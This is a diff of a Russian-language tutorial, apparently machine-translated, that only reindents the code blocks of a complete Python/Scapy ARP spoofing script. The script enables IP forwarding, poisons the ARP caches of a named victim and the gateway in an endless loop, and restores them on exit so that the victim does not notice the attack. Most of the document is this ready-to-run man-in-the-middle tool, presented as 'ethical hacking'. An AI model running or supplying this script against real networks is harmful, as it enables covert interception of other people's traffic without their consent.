@@ -62,11 +62,11 @@ to run this:
 Прежде всего, нам нужно импортировать необходимые модули:
 
     ```
-from scapy.all import Ether, ARP, srp, send
-import argparse
-import time
-import os
-import sys
+	from scapy.all import Ether, ARP, srp, send
+	import argparse
+	import time
+	import os
+	import sys
     ```
 
 Примечание: Вам нужно иметь библиотеку Scapy, установленную на вашем компьютере, перейдите к этому сообщению или официальному веб-сайту Scapy.
@@ -78,57 +78,57 @@ import sys
 Для Unix-подобных пользователей (платформа, предлагаемая для этого учебника) вам нужно отредактировать файл "/proc/sys/net/ipv4/ip_forward", который требует доступа root, и поставить значение 1, которое указывает как включенное. Ознакомьтесь с этим руководством для получения дополнительной информации. Эта функция делает это в любом случае:
 
     ```
-def _enable_linux_iproute():
-    """
-    Enables IP route ( IP Forward ) in linux-based distro
-    """
-    file_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(file_path) as f:
-        if f.read() == 1:
-            # already enabled
-            return
-    with open(file_path, "w") as f:
-        print(1, file=f)
+	def _enable_linux_iproute():
+	    """
+	    Enables IP route ( IP Forward ) in linux-based distro
+	    """
+	    file_path = "/proc/sys/net/ipv4/ip_forward"
+	    with open(file_path) as f:
+	        if f.read() == 1:
+	            # already enabled
+	            return
+	    with open(file_path, "w") as f:
+	        print(1, file=f)
     ```
 
 Для пользователей Windows после копирования services.py в текущий каталог можно скопировать и вставить следующую функцию:
 
     ```
-def _enable_windows_iproute():
-    """
-    Enables IP route (IP Forwarding) in Windows
-    """
-    from services import WService
-    # enable Remote Access service
-    service = WService("RemoteAccess")
-    service.start()
+	def _enable_windows_iproute():
+	    """
+	    Enables IP route (IP Forwarding) in Windows
+	    """
+	    from services import WService
+	    # enable Remote Access service
+	    service = WService("RemoteAccess")
+	    service.start()
     ```
 
 Приведенная ниже функция управляет включением IP-маршрутизации на всех платформах:
 
     ```
-def enable_ip_route(verbose=True):
-    """
-    Enables IP forwarding
-    """
-    if verbose:
-        print("[!] Enabling IP Routing...")
-    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
-    if verbose:
-        print("[!] IP Routing enabled.")
+	def enable_ip_route(verbose=True):
+	    """
+	    Enables IP forwarding
+	    """
+	    if verbose:
+	        print("[!] Enabling IP Routing...")
+	    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
+	    if verbose:
+	        print("[!] IP Routing enabled.")
     ```
 
 Теперь давайте перейдем к классным вещам. Во-первых, нам нужна функция утилиты, которая позволяет нам получить MAC-адрес любой машины в сети:
 
     ```
-def get_mac(ip):
-    """
-    Returns MAC address of any device connected to the network
-    If ip is down, returns None instead
-    """
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
-    if ans:
-        return ans[0][1].src
+	def get_mac(ip):
+	    """
+	    Returns MAC address of any device connected to the network
+	    If ip is down, returns None instead
+	    """
+	    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+	    if ans:
+	        return ans[0][1].src
     ```
 
 Связанные с: Как сделать изменение MAC-адреса в Python
@@ -138,24 +138,24 @@ def get_mac(ip):
 Во-вторых, мы собираемся создать функцию, которая выполняет основную работу этого учебника; учитывая целевой IP-адрес и IP-адрес хоста, он изменяет кэш ARP целевого IP-адреса, говоря, что у нас есть IP-адрес хоста:
 
     ```
-def spoof(target_ip, host_ip, verbose=True):
-    """
-    Spoofs `target_ip` saying that we are `host_ip`.
-    it is accomplished by changing the ARP cache of the target (poisoning)
-    """
-    # get the mac address of the target
-    target_mac = get_mac(target_ip)
-    # craft the arp 'is-at' operation packet, in other words; an ARP response
-    # we don't specify 'hwsrc' (source MAC address)
-    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    # send the packet
-    # verbose = 0 means that we send the packet without printing any thing
-    send(arp_response, verbose=0)
-    if verbose:
-        # get the MAC address of the default interface we are using
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+	def spoof(target_ip, host_ip, verbose=True):
+	    """
+	    Spoofs `target_ip` saying that we are `host_ip`.
+	    it is accomplished by changing the ARP cache of the target (poisoning)
+	    """
+	    # get the mac address of the target
+	    target_mac = get_mac(target_ip)
+	    # craft the arp 'is-at' operation packet, in other words; an ARP response
+	    # we don't specify 'hwsrc' (source MAC address)
+	    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
+	    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+	    # send the packet
+	    # verbose = 0 means that we send the packet without printing any thing
+	    send(arp_response, verbose=0)
+	    if verbose:
+	        # get the MAC address of the default interface we are using
+	        self_mac = ARP().hwsrc
+	        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
     ```
 
 Связанные с: Создание 24 этических хакерских скриптов и инструментов с помощью Python Book
@@ -165,24 +165,24 @@ def spoof(target_ip, host_ip, verbose=True):
 Как только мы захотим остановить атаку, нам нужно переназначить реальные адреса целевому устройству (а также шлюзу), если мы этого не сделаем, жертва потеряет подключение к Интернету, и будет очевидно, что что-то произошло, мы не хотим этого делать, мы отправим семь законных пакетов ответа ARP (обычная практика) последовательно:
 
     ```
-def restore(target_ip, host_ip, verbose=True):
-    """
-    Restores the normal process of a regular network
-    This is done by sending the original informations 
-    (real IP and MAC of `host_ip` ) to `target_ip`
-    """
-    # get the real MAC address of target
-    target_mac = get_mac(target_ip)
-    # get the real MAC address of spoofed (gateway, i.e router)
-    host_mac = get_mac(host_ip)
-    # crafting the restoring packet
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
-    # sending the restoring packet
-    # to restore the network to its normal process
-    # we send each reply seven times for a good measure (count=7)
-    send(arp_response, verbose=0, count=7)
-    if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+	def restore(target_ip, host_ip, verbose=True):
+	    """
+	    Restores the normal process of a regular network
+	    This is done by sending the original informations 
+	    (real IP and MAC of `host_ip` ) to `target_ip`
+	    """
+	    # get the real MAC address of target
+	    target_mac = get_mac(target_ip)
+	    # get the real MAC address of spoofed (gateway, i.e router)
+	    host_mac = get_mac(host_ip)
+	    # crafting the restoring packet
+	    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
+	    # sending the restoring packet
+	    # to restore the network to its normal process
+	    # we send each reply seven times for a good measure (count=7)
+	    send(arp_response, verbose=0, count=7)
+	    if verbose:
+	        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
     ```
 
 Это было похоже на функцию spoof(), и единственное отличие заключается в том, что она отправляет несколько легитимных пакетов. Другими словами, он посылает правдивую информацию.
@@ -190,27 +190,27 @@ def restore(target_ip, host_ip, verbose=True):
 Теперь нам нужно будет написать основной код, который подделывает оба; цель и хост (шлюз) бесконечно до тех пор, пока не будет обнаружен CTRL+C, поэтому мы восстановим исходные адреса:
 
     ```
-if __name__ == "__main__":
-    # victim ip address
-    target = "192.168.1.100"
-    # gateway ip address
-    host = "192.168.1.1"
-    # print progress to the screen
-    verbose = True
-    # enable ip forwarding
-    enable_ip_route()
-    try:
-        while True:
-            # telling the `target` that we are the `host`
-            spoof(target, host, verbose)
-            # telling the `host` that we are the `target`
-            spoof(host, target, verbose)
-            # sleep for one second
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)
+	if __name__ == "__main__":
+	    # victim ip address
+	    target = "192.168.1.100"
+	    # gateway ip address
+	    host = "192.168.1.1"
+	    # print progress to the screen
+	    verbose = True
+	    # enable ip forwarding
+	    enable_ip_route()
+	    try:
+	        while True:
+	            # telling the `target` that we are the `host`
+	            spoof(target, host, verbose)
+	            # telling the `host` that we are the `target`
+	            spoof(host, target, verbose)
+	            # sleep for one second
+	            time.sleep(1)
+	    except KeyboardInterrupt:
+	        print("[!] Detected CTRL+C ! restoring the network, please wait...")
+	        restore(target, host)
+	        restore(host, target)
     ```
 
 Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book
